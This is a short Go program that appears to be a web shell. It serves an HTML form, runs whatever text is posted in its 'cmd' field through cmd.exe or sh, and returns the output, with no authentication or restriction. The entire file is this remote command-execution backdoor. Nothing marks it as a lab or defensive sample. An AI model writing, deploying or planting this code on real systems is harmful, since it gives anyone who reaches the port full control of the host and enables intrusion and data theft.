package main 

import (
    "fmt"
    "net/http"
    "strings"
    "os/exec"
    "runtime"
    "flag"
)

func run_cmd(cmd string) string {
    if runtime.GOOS == "windows" {
        sh := "cmd.exe"
        out, err := exec.Command(sh,"/K", cmd).Output()
        if err != nil {
            return fmt.Sprintf("Error: %s", err)
        }
        return string(out)
    } else {

        sh := "sh"
        out, err := exec.Command(sh, "-c", cmd).Output()
        if err != nil {
            return fmt.Sprintf("Error: %s", err)
        }
        return string(out)
    }
}

func handler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "<html>")
    if r.Method == "POST" {
        r.ParseForm()
        var cmd string = strings.Join(r.Form["cmd"], " ")

        var result string = run_cmd(cmd)
        fmt.Fprintf(w, "<textarea rows=\"30\" cols=\"100\">%s</textarea>", result)
    } else {
        fmt.Fprintf(w, "<textarea rows=\"30\" cols=\"100\"></textarea>")
    }

    fmt.Fprintf(w, "<form action=\"/\" method=\"POST\">" +
        "<input type=\"text\" name=\"cmd\" size =\"60\" autofocus>"+
        "<input type=\"submit\" value=\"run\"></html>")
}

func main() {
    var ip, port string
    flag.StringVar(&ip, "ip", "", "IP")
    flag.StringVar(&port, "port", "8080", "Port")
    flag.Parse()

    http.HandleFunc("/", handler)
    http.ListenAndServe(ip + ":" + port, nil)
}
